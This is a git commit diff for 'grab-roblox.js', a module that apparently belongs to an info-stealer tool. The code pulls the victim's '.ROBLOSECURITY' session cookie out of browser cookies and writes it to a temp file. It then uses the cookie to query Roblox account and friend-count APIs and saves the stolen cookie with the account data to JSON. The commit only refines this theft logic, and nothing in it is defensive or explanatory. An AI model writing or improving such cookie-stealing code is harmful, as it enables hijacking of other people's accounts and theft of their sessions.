5e208622afe7261cb3dfcd398a2730dab72d7987
Yuuto <55290516+JustYuuto@users.noreply.github.com>
2023-08-17 15:39:13 +0200

    roblox cookie

--- functions/grab-roblox.js
+++ functions/grab-roblox.js
@@ -8,21 +8,18 @@ const { getTempFolder } = require('../util/init');
 
 module.exports = async () => {
   const cookies = await getCookies();
-  const cookieValue = cookies.find(cookie => cookie.host.includes('.roblox.com') && cookie.name === '.ROBLOSECURITY');
+  const cookieValue = cookies?.find(cookie => cookie.host.includes('.roblox.com') && cookie.name === '.ROBLOSECURITY');
   if (!cookieValue) return;
   const { value: cookie, source } = cookieValue;
   fs.writeFileSync(join(getTempFolder(), 'Roblox Cookie.txt'), cookie);
 
-  const file = await searchForFile(join(getTempFolder(), 'Roblox Cookie.txt'), 1000, 10);
-  if (!file || file.trim() === '') return;
+  const file = await searchForFile(join(getTempFolder(), 'Roblox Cookie.txt'), 100, 10);
   const jsonFile = join(getTempFolder(), 'Roblox.json');
-  const config = {
-    headers: { Cookie: '.ROBLOSECURITY=' + file.replaceAll('"', '') }
-  };
+  const config = { headers: { Cookie: '.ROBLOSECURITY=' + file.replaceAll('"', '') } };
   const account = await axios.get('https://www.roblox.com/mobileapi/userinfo', config);
   const friendsCount = await axios.get('https://friends.roblox.com/v1/my/friends/count', config) || undefined;
   account.data.source = source;
-  account.data.cookie = file.replaceAll('"', '');
+  account.data.cookie = cookieValue || file.replaceAll('"', '');
   account.data.friendsCount = friendsCount.data.count;
   writeFileSync(jsonFile, JSON.stringify(account.data));
 };
